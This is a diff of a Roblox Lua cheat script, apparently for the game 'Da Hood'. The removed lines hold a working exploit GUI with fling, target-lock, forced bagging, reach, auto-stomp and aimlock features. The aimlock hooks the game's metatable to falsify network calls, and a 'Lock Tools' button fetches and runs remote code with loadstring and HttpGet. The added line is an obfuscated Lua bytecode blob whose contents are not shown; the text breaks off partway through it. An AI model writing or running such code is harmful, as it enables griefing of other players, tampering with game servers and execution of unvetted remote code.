-	Lock.Text = "Target"
-	Lock.TextColor3 = Color3.fromRGB(0, 0, 0)
-	Lock.TextSize = 23.000
-	Lock.MouseButton1Click:Connect(function()
-
-		if Lock.Text == 'Target' then
-			Lock.Text = 'Untarget'
-			pcall(function()
-				player.Character.LeftHand.LeftWrist:Destroy();
-				player.Character.RightHand.RightWrist:Destroy();
-			end);
-			local loopFunction = function()
-				if game.Players:FindFirstChild(NameHere.Text).Character then
-					player.Character.LeftHand.CFrame  = CFrame.new(game.Players[NameHere.Text].Character.UpperTorso.Position);
-					player.Character.RightHand.CFrame = CFrame.new(game.Players[NameHere.Text].Character.UpperTorso.Position);
-					if game.Players:FindFirstChild(NameHere.Text).Character.BodyEffects['K.O'].Value == true then
-						Lock.Text = 'Target'
-					end
-				else
-					Lock.Text = 'Target'
-				end
-			end;        
-			local Loop
-			local Start = function()
-				Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
-			end;         
-			local Pause = function()
-				Loop:Disconnect()
-				announce('Target', 'no longer targeting', 5)
-				player.Character.LeftHand.CFrame  = player.Character.LeftLowerArm.CFrame
-				player.Character.RightHand.CFrame = player.Character.RightLowerArm.CFrame
-			end;
-			Start()
-			repeat wait() until Lock.Text == 'Target'
-			Pause()
-		else
-			Lock.Text = 'Target'
-		end
-
-	end)
-
-
-
-
-
-	View.Name = "View"
-	View.Parent = ScrollingFrame
-	View.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
-	View.BackgroundTransparency = 0.350
-	View.BorderColor3 = Color3.fromRGB(27, 42, 53)
-	View.Position = UDim2.new(0.127792194, 0, 0.18098104, 0)
-	View.Size = UDim2.new(0, 106, 0, 24)
-	View.Font = Enum.Font.SourceSans
-	View.Text = "View"
-	View.TextColor3 = Color3.fromRGB(0, 0, 0)
-	View.TextSize = 23.000
-	View.MouseButton1Click:Connect(function()
-
-		if View.Text == "View" then
-
-			View.Text = "UnView"
-
-			game:GetService("Workspace"):FindFirstChild("Camera").CameraSubject = game:GetService("Players")[target].Character:FindFirstChildOfClass("Humanoid")
-
-		else
-			View.Text = "View"
-			game:GetService("Workspace"):FindFirstChild("Camera").CameraSubject = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-		end
-
-	end)
-
-
-	Bag.Name = "Bag"
-	Bag.Parent = ScrollingFrame
-	Bag.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
-	Bag.BackgroundTransparency = 0.350
-	Bag.BorderColor3 = Color3.fromRGB(27, 42, 53)
-	Bag.Position = UDim2.new(0.127792194, 0, 0.290300041, 0)
-	Bag.Size = UDim2.new(0, 106, 0, 24)
-	Bag.Font = Enum.Font.SourceSans
-	Bag.Text = "Bag"
-	Bag.TextColor3 = Color3.fromRGB(0, 0, 0)
-	Bag.TextSize = 23.000
-	Bag.MouseButton1Click:Connect(function()
-
-		jo = game:GetService('Players').LocalPlayer
-		X1 = jo.Character:FindFirstChild('HumanoidRootPart').CFrame.X
-		Y1 = jo.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
-		Z1 = jo.Character:FindFirstChild('HumanoidRootPart').CFrame.Z
-
-
-
-		local TargetPlr = NameHere.Text
-		function getRoot(char)
-			local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
-			return rootPart
-		end
-
-		if TargetPlr and game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == false then
-			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop['[BrownBag] - $25'].Head.CFrame
-			wait(.30)
-			fireclickdetector(game.Workspace.Ignored.Shop['[BrownBag] - $25'].ClickDetector)
-			game.Players.LocalPlayer.Backpack:WaitForChild("[BrownBag]").Parent = game.Players.LocalPlayer.Character
-
-			wait(.5)
-			repeat
-				pcall(function()
-					wait()
-					getRoot(game.Players[TargetPlr].Character).CFrame = getRoot(game.Players.LocalPlayer.Character).CFrame + Vector3.new(1,3,0)
-					game.Players.LocalPlayer.Character["[BrownBag]"]:Activate()
-				end)
-			until game.Players[TargetPlr].Character:FindFirstChild("Christmas_Sock")
-		elseif game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == false then
-
-			game.StarterGui:SetCore("SendNotification", {Title = "D34TH_3V1L [Target Gui]", Text = "The target is knocked", Duration = 15
-
-			})
-
-		end
-
-		if game.Players[TargetPlr].Character:FindFirstChild("Christmas_Sock") then
-
-
-			jo = game:GetService('Players').LocalPlayer
-			jo.Character.HumanoidRootPart.CFrame = CFrame.new(X1,Y1,Z1)
-
-		end
-
-	end)
-
-	Fling.Name = "Fling"
-	Fling.Parent = ScrollingFrame
-	Fling.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
-	Fling.BackgroundTransparency = 0.350
-	Fling.BorderColor3 = Color3.fromRGB(27, 42, 53)
-	Fling.Position = UDim2.new(0.127792194, 0, 0.344063491, 0)
-	Fling.Size = UDim2.new(0, 106, 0, 24)
-	Fling.Font = Enum.Font.SourceSans
-	Fling.Text = "Fling"
-	Fling.TextColor3 = Color3.fromRGB(0, 0, 0)
-	Fling.TextSize = 23.000
-	Fling.MouseButton1Click:Connect(function()
-		if Fling.Text == 'Fling' then
-			Fling.Text = 'Unfling'
-			local Loop
-			local OldFlingPos = player.Character.HumanoidRootPart.Position
-			local loopFunction = function()
-				local success,err = pcall(function()
-					local FlingEnemy = Players:FindFirstChild(NameHere.Text).Character
-					if FlingEnemy and player.Character then
-						FlingTorso = FlingEnemy.UpperTorso
-						local dis = 3.85
-						local increase = 6
-						if FlingEnemy.Humanoid.MoveDirection.X < 0 then
-							xchange = -increase
-						elseif FlingEnemy.Humanoid.MoveDirection.X > 0  then
-							xchange = increase
-						else
-							xchange = 0
-						end
-						if FlingEnemy.Humanoid.MoveDirection.Z < 0 then
-							zchange = -increase
-						elseif FlingEnemy.Humanoid.MoveDirection.Z > 0 then
-							zchange = increase
-						else
-							zchange = 0
-						end          
-						if player.Character then
-							player.Character:FindFirstChildWhichIsA('Humanoid'):ChangeState(11)
-							player.Character.HumanoidRootPart.CFrame = CFrame.new(FlingTorso.Position.X + math.random(-dis,dis) + xchange, FlingTorso.Position.Y, FlingTorso.Position.Z + math.random(-dis,dis) + zchange) * CFrame.Angles(math.rad(player.Character.HumanoidRootPart.Orientation.X + 350),math.rad(player.Character.HumanoidRootPart.Orientation.Y + 200),math.rad(player.Character.HumanoidRootPart.Orientation.Z + 240))
-							player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
-						end
-					end
-				end)
-				if err then
-					print('fling error : ' .. err)
-				end
-			end;
-			local Start = function()    
-				OldFlingPos = player.Character.HumanoidRootPart.Position
-				Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
-			end;
-			local Pause = function()
-				Loop:Disconnect()
-				local vectorZero = Vector3.new(0, 0, 0)
-				player.Character.PrimaryPart.Velocity = vectorZero
-				player.Character.PrimaryPart.RotVelocity = vectorZero
-				player.Character.HumanoidRootPart.CFrame = CFrame.new(OldFlingPos) * CFrame.Angles(math.rad(0),math.rad(137.92),math.rad(0))
-			end;
-			Start()	
-			repeat wait() until Fling.Text == 'Fling'
-			Pause()
-		else
-			Fling.Text = 'Fling'
-		end
-	end)
-
-	GoTo.Name = "GoTo"
-	GoTo.Parent = ScrollingFrame
-	GoTo.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
-	GoTo.BackgroundTransparency = 0.350
-	GoTo.BorderColor3 = Color3.fromRGB(27, 42, 53)
-	GoTo.Position = UDim2.new(0.127792194, 0, 0.399619043, 0)
-	GoTo.Size = UDim2.new(0, 106, 0, 24)
-	GoTo.Font = Enum.Font.SourceSans
-	GoTo.Text = "GoTo"
-	GoTo.TextColor3 = Color3.fromRGB(0, 0, 0)
-	GoTo.TextSize = 23.000
-	GoTo.MouseButton1Click:Connect(function()
-
-
-		Plr.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[NameHere.Text].Character.UpperTorso.Position + Vector3.new(0, 0, 0))
-
-	end)
-
-	Info.Name = "Info"
-	Info.Parent = ScrollingFrame
-	Info.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
-	Info.BackgroundTransparency = 0.350
-	Info.BorderColor3 = Color3.fromRGB(27, 42, 53)
-	Info.Position = UDim2.new(0.127792194, 0, 0.455174595, 0)
-	Info.Size = UDim2.new(0, 106, 0, 24)
-	Info.Font = Enum.Font.SourceSans
-	Info.Text = "Info"
-	Info.TextColor3 = Color3.fromRGB(0, 0, 0)
-	Info.TextSize = 23.000
-	Info.MouseButton1Click:Connect(function()
-
-		Skid = target
-
-		game.StarterGui:SetCore("SendNotification", {Title = "D34TH_3V1L [Target Gui]", Text = "Information printed on the console press F9 to see it", Duration = 10
-
-		})
-
-		print("D34TH_3V1L [Target Gui]")
-		print("------------------")
-		print(""..game:GetService("Players")[Skid].Name.."Tools: ")
-		print("------------------")
-		for i, v in pairs(game:GetService("Players")[Skid].Backpack:GetDescendants()) do
-			if v:IsA("Tool") then
-				print(""..v.Name.."")
-			end
-		end
-
-		print("------------------")
-		print(""..game:GetService("Players")[Skid].Name.." | Information:")
-		print("------------------")
-		print("Account Age: "..game:GetService("Players")[Skid].AccountAge)
-		print("User ID: "..game:GetService("Players")[Skid].UserId)
-		print("Cash: $"..game:GetService("Players")[Skid].DataFolder.Currency.Value)
-		print("Wanted: "..game:GetService("Players")[Skid].DataFolder.Information.Wanted.Value)
-		print("Shoes Collected: "..game.Players.LocalPlayer.Character.BodyEffects.ShoesCollect.Value)
-		print("Shirt Template: "..game:GetService("Players")[Skid].Character.Shirt.ShirtTemplate)
-		print("Pants Template: "..game:GetService("Players")[Skid].Character.Pants.PantsTemplate)
-		print("Crew ID: "..game:GetService("Players")[Skid].DataFolder.Information.Crew.Value)
-		print("Sound ID: "..game:GetService("Players")[Skid].Character.LowerTorso.BOOMBOXSOUND.SoundId)
-		print("------------------")
-
-
-
-	end)
-
-
-
-	NameHere.Name = "NameHere"
-	NameHere.Parent = Frame
-	NameHere.BackgroundColor3 = Color3.fromRGB(56, 56, 56)
-	NameHere.BackgroundTransparency = 0.100
-	NameHere.Position = UDim2.new(0.0726599917, 0, 0.872886837, 0)
-	NameHere.Size = UDim2.new(0, 133, 0, 23)
-	NameHere.Font = Enum.Font.SourceSans
-	NameHere.Text = "Target Here"
-	NameHere.TextColor3 = Color3.fromRGB(0, 0, 0)
-	NameHere.TextSize = 14.000
-
-	-- Scripts:
-
-	local function BYEEA_fake_script() -- Frame.LocalScript 
-		local script = Instance.new('LocalScript', Frame)
-
-		local UIS = game:GetService('UserInputService')
-		local frame = script.Parent
-		local dragToggle = nil
-		local dragSpeed = 0.25
-		local dragStart = nil
-		local startPos = nil
-
-		local function updateInput(input)
-			local delta = input.Position - dragStart
-			local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
-				startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-			game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
-		end
-
-		frame.InputBegan:Connect(function(input)
-			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
-				dragToggle = true
-				dragStart = input.Position
-				startPos = frame.Position
-				input.Changed:Connect(function()
-					if input.UserInputState == Enum.UserInputState.End then
-						dragToggle = false
-					end
-				end)
-			end
-		end)
-
-		UIS.InputChanged:Connect(function(input)
-			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-				if dragToggle then
-					updateInput(input)
-				end
-			end
-		end)
-	end
-	coroutine.wrap(BYEEA_fake_script)()
-
-
-	-- Auto Complete
-
-	NameHere.FocusLost:Connect(function()
-		local Text = NameHere.Text
-
-		for i,v in next, game:GetService("Players"):GetPlayers() do
-			if v.Name:lower():match('^'..Text:lower()) then
-				NameHere.Text = v.Name
-				target = v.Name
-				Skid = target
-			end
-		end
-	end)
-end)
-
-local FirstToggle = CombatPage.AddToggle("Reach", false, function(bool)
-	local player = game.Players.LocalPlayer
-
-	fistreac = false
-	if bool then
-		fistreac = true
-		while fistreac == true do
-			wait()
-			local success, err = pcall(function()
-				if player.Character.BodyEffects.Attacking.Value == true then
-					for i,v in pairs(game:GetService('Players'):GetChildren()) do
-						if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <= 50 then
-							if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
-								if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
-									firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
-								else
-									firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
-									firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
-									firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
-									firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
-									firetouchinterest(game.Players.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
-									firetouchinterest(game.Players.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
-								end
-							end
-						end
-					end
-				end
-			end)
-		end
-	else
-		fistreac = false
-	end
-end)
-
-local xdpussy = CombatPage.AddButton("Free-Fists [Q]", function()
-	-- // Variables
-	local localPlayer       = game:GetService("Players").LocalPlayer
-	local localCharacter    = localPlayer.Character
-	local Mouse             = localPlayer:GetMouse()
-	local FistControl       = false
-	local LeftFist          = localCharacter.LeftHand
-	local RightFist         = localCharacter.RightHand
-
-	-- // Services
-	local uis = game:GetService("UserInputService")
-
-	-- // Coroutine Loop + Functions
-	local loopFunction = function()
-		LeftFist.CFrame  = CFrame.new(Mouse.Hit.p)
-		RightFist.CFrame = CFrame.new(Mouse.Hit.p)
-	end
-
-	local Loop
-
-	local Start = function()
-		Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction)
-	end
-
-	local Pause = function()
-		Loop:Disconnect()
-	end
-
-	-- // Hotkeys
-	uis.InputBegan:connect(function(Key)
-		if (Key.KeyCode == Enum.KeyCode.Q) then
-			if (FistControl == false) then
-				FistControl = true
-				Start()
-				pcall(function()
-					localCharacter.RightHand.RightWrist:Remove()
-					localCharacter.LeftHand.LeftWrist:Remove()
-				end)
-			elseif (FistControl == true) then
-				FistControl = false
-				Pause()
-				local rightwrist  = Instance.new("Motor6D")
-				rightwrist.Name   = "RightWrist"
-				rightwrist.Parent = localCharacter.RightHand
-				rightwrist.C0     = CFrame.new(1.18422506e-07, -0.5009287, -6.81715525e-18, 1, 0, 0, 0, 1, 0, 0, 0, 1)
-				rightwrist.C1     = CFrame.new(3.55267503e-07, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
-				rightwrist.Part0  = localCharacter.RightLowerArm
-				rightwrist.Part1  = localCharacter.RightHand
-
-				local leftwrist   = Instance.new("Motor6D")
-				leftwrist.Name    = "LeftWrist"
-				leftwrist.Parent  = localCharacter.LeftHand
-				leftwrist.C0      = CFrame.new(0.000475466368, -0.5009287, 7.59417072e-20, 1, 0, 0, 0, 1, 0, 0, 0, 1)
-				leftwrist.C1      = CFrame.new(0.000475821638, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
-				leftwrist.Part0   = localCharacter.LeftLowerArm
-				leftwrist.Part1   = localCharacter.LeftHand
-			end
-		end
-	end)
-end)
-local FirstToggle = CombatPage.AddToggle("Auto-Block", false, function(AutoBlock)
-
-	if AutoBlock == true then
-		autoblock = true
-
-		MainEvent = game:GetService('ReplicatedStorage').MainEvent
-		player = game.Players.LocalPlayer
-		Distancia = 15
-
-		game:GetService('RunService'):BindToRenderStep("Auto-Block", 0 , function()
-
-			local forbidden = {'[Popcorn]','[HotDog]','[GrenadeLauncher]','[RPG]','[SMG]','[TacticalShotgun]','[AK47]','[AUG]','[Glock]', '[Shotgun]','[Flamethrower]','[Silencer]','[AR]','[Revolver]','[SilencerAR]','[LMG]','[P90]','[DrumGun]','[Double-Barrel SG]','[Hamburger]','[Chicken]','[Pizza]','[Cranberry]','[Donut]','[Taco]','[Starblox Latte]','[BrownBag]','[Weights]','[HeavyWeights]'}
-			local Found = false
-			for _,v in pairs(game.Workspace.Players:GetChildren()) do
-				if (v.UpperTorso.Position - player.Character.HumanoidRootPart.Position).Magnitude <= Distancia then
-					if v.BodyEffects.Attacking.Value == true and not table.find(forbidden, v:FindFirstChildWhichIsA('Tool').Name ) and v.Name ~= player.Name then
-						Found = true
-						MainEvent:FireServer('Block', player.Name)
-
-					end
-				end
-			end
-			if Found == false then
-				if player.Character.BodyEffects:FindFirstChild('Block') then player.Character.BodyEffects.Block:Destroy() end
-			end
-		end)
-	end
-	if AutoBlock == false then
-		autoblock = false
-		game:GetService('RunService'):UnbindFromRenderStep("Auto-Block")
-
-	end
-
-end)
-
-local FirstToggle = CombatPage.AddToggle("Hide-Block", false, function(HideBlock)
-
-	player = game.Players.LocalPlayer
-
-	if HideBlock == true then
-		game:GetService('RunService'):BindToRenderStep("Hide-Block", 0 , function()
-
-			wait()
-			for _,v in pairs(player.Character:FindFirstChildWhichIsA('Humanoid'):GetPlayingAnimationTracks()) do
-				if v.Name == 'Block' then
-					v:Stop()
-				end
-			end
-		end)
-	end	
-
-	if HideBlock == false then
-
-		game:GetService('RunService'):UnbindFromRenderStep("Hide-Block")
-
-	end
-
-end)
-
-local FirstToggle = CombatPage.AddToggle("Anti-Slow", false, function(gh)
-	if gh == true then
-		game:GetService('RunService'):BindToRenderStep("Anti-Slow", 0 , function()
-			if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed"):Destroy() end
-			if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk"):Destroy() end
-			if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping"):Destroy() end
-			if game.Players.LocalPlayer.Character.BodyEffects.Reload.Value == true then game.Players.LocalPlayer.Character.BodyEffects.Reload.Value = false end
-		end)
-	elseif gh == false then
-		game:GetService('RunService'):UnbindFromRenderStep("Anti-Slow")
-	end
-end)
-local FirstToggle = CombatPage.AddToggle("Auto-Stomp", false, function(r)
-	if r == true then
-		game:GetService('RunService'):BindToRenderStep("Auto-Stomp", 0 , function()
-			game:GetService("ReplicatedStorage").MainEvent:FireServer("Stomp")
-		end)
-	elseif r == false then
-		game:GetService('RunService'):UnbindFromRenderStep("Auto-Stomp")
-	end
-end)
-local FirstToggle = CombatPage.AddToggle("Anti-Stomp", false, function(x)
-	if x == true then
-		game:GetService('RunService'):BindToRenderStep("Anti-Stomp", 0 , function()
-
-
-			if game.Players.LocalPlayer.Character.Humanoid.Health <= 5 then
-
-				for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-					if v:IsA('MeshPart') or v:IsA('Part') then
-						v:Destroy()						
-					end
-				end
-				for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-					if v:IsA('Accessory') then
-						v.Handle:Destroy()
-					end
-				end
-			end
-
-
-		end)
-
-	elseif x == false then
-		game:GetService('RunService'):UnbindFromRenderStep("Anti-Stomp")
-	end
-end)
-local FirstButton = CombatPage.AddButton("No Recoil", function()
-	local player = game.Players.LocalPlayer
-	for i,v in pairs(game:GetService('Workspace'):GetChildren()) do
-		if v:IsA('Camera') then
-			v:Destroy()
-		end
-	end
-	local newcam = Instance.new('Camera')
-	newcam.Parent = game:GetService('Workspace')
-	newcam.Name = 'Camera'
-	newcam.CameraType = 'Custom'
-	newcam.CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')
-	newcam.HeadLocked = true
-	newcam.HeadScale = 1 
-end)
-
-local FirstButton = CombatPage.AddButton("Lock Tools", function()
-
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/D34THEV1L/DaHoodCodesSource/main/Lock%20Tools"))()
-
-end)
-
-local FirstButton = CombatPage.AddButton("Aimlock (Q)", function()
-	_G.KEY = "q"
-	_G.PART = "LowerTorso"
-	_G.PRED = 0.037
-	_G.Frame = Vector3.new(0,0.53,0)
-	_G.AIR = -0.5
-	_G.SHIT = 0.1
-
-
-	local CC = game:GetService "Workspace".CurrentCamera
-	local Plr
-	local enabled = false
-	local accomidationfactor = nil
-	local mouse = game.Players.LocalPlayer:GetMouse()
-	local placemarker = Instance.new("Part", game.Workspace)
-	local guimain = Instance.new("Folder", game.CoreGui)
-
-	getgenv().makemarker = function(Parent, Adornee, Color, Size, Size2)
-		local e = Instance.new("BillboardGui", Parent)
-		e.Name = "PP"
-		e.Adornee = Adornee
-		e.Size = UDim2.new(Size, Size2, Size, Size2)
-		e.AlwaysOnTop = true
-		local a = Instance.new("Frame", e)
-		a.Size = UDim2.new(4, 0, 4, 0)
-		a.BackgroundTransparency = 0.1
-		a.BackgroundColor3 = Color
-		local g = Instance.new("UICorner", a)
-		g.CornerRadius = UDim.new(50, 50)
-		return (e)
-	end
-
-	local data = game.Players:GetPlayers()
-	function noob(player)
-		local character
-		repeat
-			wait()
-		until player.Character
-		local handler = makemarker(guimain, player.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0.0, 0)
-		handler.Name = player.Name
-		player.CharacterAdded:connect(
-			function(Char)
-				handler.Adornee = Char:WaitForChild(_G.PART)
-			end
-		)
-
-		local TextLabel = Instance.new("TextLabel", handler)
-		TextLabel.BackgroundTransparency = 1
-		TextLabel.Position = UDim2.new(0, 0, 0, -50)
-		TextLabel.Size = UDim2.new(0, 100, 0, 100)
-		TextLabel.Font = Enum.Font.SourceSansSemibold
-		TextLabel.TextSize = 14
-		TextLabel.TextColor3 = Color3.new(1, 1, 1)
-		TextLabel.TextStrokeTransparency = 0
-		TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
-		TextLabel.Text = "Name: " .. player.Name
-		TextLabel.ZIndex = 10
-
-		spawn(
-			function()
-				while wait() do
-					if player.Character then
-						--TextLabel.Text = player.Name.." | Bounty: "..tostring(player:WaitForChild("leaderstats").Wanted.Value).." | "..tostring(math.floor(player.Character:WaitForChild("Humanoid").Health))
-					end
-				end
-			end
-		)
-	end
-
-	for i = 1, #data do
-		if data[i] ~= game.Players.LocalPlayer then
-			noob(data[i])
-		end
-	end
-
-	game.Players.PlayerAdded:connect(
-		function(Player)
-			noob(Player)
-		end
-	)
-
-	game.Players.PlayerRemoving:Connect(
-		function(player)
-			guimain[player.Name]:Destroy()
-		end
-	)
-
-	spawn(
-		function()
-			placemarker.Anchored = true
-			placemarker.CanCollide = false
-			placemarker.Size = Vector3.new(0.1, 0.1, 0.1)
-			placemarker.Transparency = _G.SHIT
-			makemarker(placemarker, placemarker, Color3.fromRGB(255, 255, 255), 0.20, 0)
-		end
-	)
-
-	mouse.KeyDown:Connect(
-		function(k)
-			if k ~= _G.KEY then
-				return
-			end
-			if enabled then
-				-- guimain[Plr.Name].Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-				enabled = false
-				TextLabel.TextColor3 = Color3.fromRGB(255, 20, 75)
-				TextLabel.Text = "------"
-			else
-				--guimain[Plr.Name].Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-				enabled = true
-				Plr = getClosestPlayerToCursor()
-				TextLabel.TextColor3 = Color3.fromRGB(12, 255, 0)
-				TextLabel.Text = Plr.Character.Humanoid.DisplayName
-			end
-		end)
-
-	function getClosestPlayerToCursor()
-		local closestPlayer
-		local shortestDistance = math.huge
-
-		for i, v in pairs(game.Players:GetPlayers()) do
-			if
-				v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and
-				v.Character.Humanoid.Health ~= 0 and
-				v.Character:FindFirstChild(_G.PART)
-			then
-				local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
-				local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude
-				if magnitude < shortestDistance then
-					closestPlayer = v
-					shortestDistance = magnitude
-				end
-			end
-		end
-		return closestPlayer
-	end
-
-	game:GetService "RunService".Stepped:connect(
-		function()
-			if enabled and Plr.Character and Plr.Character:FindFirstChild(_G.PART) then
-				placemarker.CFrame =
-					CFrame.new(Plr.Character[_G.PART].Position + _G.Frame + (Plr.Character[_G.PART].Velocity * accomidationfactor))
-			else
-				placemarker.CFrame = CFrame.new(0, 9999, 0)
-			end
-		end
-	)
-
-	local mt = getrawmetatable(game)
-	local old = mt.__namecall
-	setreadonly(mt, false)
-	mt.__namecall =
-		newcclosure(
-			function(...)
-				local args = {...}
-				if enabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
-				args[3] = Plr.Character[_G.PART].Position+ _G.Frame + (Plr.Character[_G.PART].Velocity * accomidationfactor)
-				return old(unpack(args))
-			end
-				return old(...)
-			end
-		)
-
-	game.Players.LocalPlayer.Chatted:Connect(
-		function(Chat)
-			if Chat == "print" then
-				print(accomidationfactor)
-			end
-		end
-	)
-
-	game.Players.LocalPlayer.Chatted:Connect(
-		function(Chat)
-			if Chat == "Code:1029" then
-
-				_G.KEY = nil
-				_G.AIR = nil
-				_G.PART = nil
-				_G.PRED = nil
-				TextLabel.Visible = false
-
-
-			end
-		end
-	)
-
-	game.Players.LocalPlayer.Chatted:Connect(
-		function(Chat)
-			if Chat == "Code:1030" then
-
-				_G.KEY = "q"
-				_G.PART = "UpperTorso"
-				_G.PRED = 0.037
-				_G.Frame = Vector3.new(0,0.0,0)
-				_G.AIR = -0.5
-				_G.SHIT = 1
-
-
-			end
-		end
-	)
-
-
-
-	game.Players.LocalPlayer.Chatted:Connect(
-		function(Chat)
-			if Chat == "P+" then
-
-
-				_G.PRED = _G.PRED+0.001
-
-
-
-			end
-		end
-	)
-
-	game.Players.LocalPlayer.Chatted:Connect(
-		function(Chat)
-			if Chat == "P-" then
-
-				_G.PRED = _G.PRED-0.001
-
-
-
-			end
-		end
-	)
-
-
-    --[[
-    while wait() do
-        local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
-        local Value = tostring(ping)
-        local pingValue = Value:split(" ")
-        local PingNumber = pingValue[1]
-        
-        accomidationfactor = PingNumber / 1000 + _G.PRED
-         if getClosestPlayerToCursor().Character.Humanoid.Jump == true and AimlockTarget.Character.Humanoid.FloorMaterial == Enum.Material.Air then
-            _G.PART = "RightFood"
-            accomidationfactor = _G.AIR
-        else
-            getClosestPlayerToCursor().Character:WaitForChild("Humanoid").StateChanged:Connect(function(old,new)
-                if new == Enum.HumanoidStateType.Freefall then
-                    _G.PART = "RightFood"
-                    accomidationfactor = _G.AIR
-                else
-                    _G.PART = "UpperTorso"
-                    accomidationfactor = PingNumber / 1000 + _G.PRED
-                end
-            end)
-        end
-    end
-    
-    ]]
-
-	while wait() do
-		local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
-		local Value = tostring(ping)
-		local pingValue = Value:split(" ")
-		local PingNumber = pingValue[1]
-
-		accomidationfactor = PingNumber / 1000 + _G.PRED
-	end
-end)
-
-
-
--- AutoBuy
-
-for i,v in pairs(game:GetService("Workspace").Ignored.Shop:GetChildren()) do
-	local FirstButton = AutoBuyPage.AddButton(v.Name, function()
-		local Pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-		local Teleport = v:FindFirstChild("Head")
-		if Teleport then
-			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Teleport.CFrame + Vector3.new(0, 3, 0)
-			local CD = v:FindFirstChild("ClickDetector")
-			if CD then
-				wait(0.75)
-				fireclickdetector(CD)
-				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Pos
-			end
-		end
-	end)
+local code = '\27\76\117\97\81\0\1\4\4\4\8\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2\152\172\16\0\0\5\0\0\0\11\64\64\0\129\128\0\0\28\128\128\1\69\0\0\0\70\128\192\0\70\192\192\0\133\0\0\0\134\128\64\1\134\192\64\1\194\0\0\0\5\1\0\0\11\65\64\2\129\129\0\0\28\129\128\1\6\193\64\2\70\1\65\2\133\1\0\0\139\65\64\3\1\130\0\0\156\129\128\1\134\193\64\3\197\65\1\0\198\129\193\3\5\2\0\0\6\130\64\4\6\194\64\4\67\2\128\4\134\194\65\1\139\2\66\5\36\3\0\0\156\66\128\1\164\66\0\0\135\66\2\0\133\130\2\0\134\194\66\5\193\2\3\0\156\130\0\1\197\130\2\0\198\194\194\5\1\67\3\0\220\130\0\1\5\131\2\0\6\195\66\6\65\67\3\0\28\131\0\1\69\131\2\0\70\195\194\6\129\67\3\0\92\131\0\1\133\131\2\0\134\195\66\7\193\131\3\0\156\131\0\1\197\131\2\0\198\195\194\7\1\196\3\0\220\131\0\1\5\132\2\0\6\196\66\8\65\196\3\0\28\132\0\1\69\132\2\0\70\196\194\8\129\196\3\0\92\132\0\1\133\132\2\0\134\196\66\9\193\196\3\0\156\132\0\1\197\132\2\0\198\196\194\9\1\197\3\0\220\132\0\1\5\133\2\0\6\197\66\10\65\197\3\0\28\133\0\1\69\133\2\0\70\197\194\10\129\197\3\0\92\133\0\1\133\133\2\0\134\197\66\11\193\197\3\0\156\133\0\1\197\133\2\0\198\197\194\11\1\198\3\0\220\133\0\1\5\134\2\0\6\198\66\12\65\6\4\0\